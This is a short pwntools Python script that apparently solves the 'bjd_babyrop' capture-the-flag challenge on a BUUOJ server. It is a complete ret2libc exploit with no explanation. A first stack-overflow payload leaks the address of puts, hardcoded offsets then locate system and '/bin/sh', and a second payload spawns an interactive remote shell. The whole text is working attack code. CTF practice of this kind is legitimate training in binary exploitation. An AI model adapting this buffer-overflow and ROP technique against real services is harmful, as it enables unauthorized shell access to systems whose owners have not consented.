from pwn import *
#sh = process("./bjd_babyrop")
sh = remote("node5.buuoj.cn",25274)
elf = ELF("./bjd_babyrop")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
vuln = 0x040067D
pop_rdi = 0x0400733
ret = 0x04004c9

payload1 = b"A"*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)
sh.recvuntil(b"story!\n")
sh.sendline(payload1)

puts_adr = u64(sh.recv().ljust(8,b'\x00'))
print(hex(puts_adr))

system = puts_adr - 0x2a300
binsh = puts_adr + 0x11d6c7
payload2 = b"A"*0x28 + p64(pop_rdi) + p64(binsh) + p64(system)
sh.recvuntil(b"!\n")
sh.sendline(payload2)
sh.interactive()
